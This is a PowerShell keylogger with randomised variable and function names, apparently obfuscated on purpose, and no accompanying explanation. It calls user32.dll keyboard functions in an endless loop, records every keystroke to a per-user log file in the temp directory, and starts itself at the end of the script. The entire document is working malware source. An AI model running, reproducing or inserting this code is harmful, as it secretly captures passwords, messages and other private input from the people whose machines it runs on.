function JUHknDWprl($faZCHPlAvk="$env:temp/$env:UserName.log") {
  echo "" >> $faZCHPlAvk
  $OcWuFHMxqw = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 $rCbunpORfd = Add-Type -MemberDefinition $OcWuFHMxqw -Name 'Win32' -Namespace API -PassThru
  try {
    while ($true) {
      Start-Sleep -Milliseconds 40
      for ($CsJHKktRdY = 9; $CsJHKktRdY -le 254; $CsJHKktRdY++) {
        $KxadItsAzL = $rCbunpORfd::GetAsyncKeyState($CsJHKktRdY)
        if ($KxadItsAzL -eq -32767) {
          $null = [console]::CapsLock
          $EypBVISPMA = $rCbunpORfd::MapVirtualKey($CsJHKktRdY, 3)
          $RXAHxhrCzl = New-Object Byte[] 256
          $rLDNkTWqUY = $rCbunpORfd::GetKeyboardState($RXAHxhrCzl)
          $RcMOoUEwia = New-Object -TypeName System.Text.StringBuilder
          if ($rCbunpORfd::ToUnicode($CsJHKktRdY, $EypBVISPMA, $RXAHxhrCzl, $RcMOoUEwia, $RcMOoUEwia.Capacity, 0)) {
            [System.IO.File]::AppendAllText($faZCHPlAvk, $RcMOoUEwia, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }
  finally {

  }
}
JUHknDWprl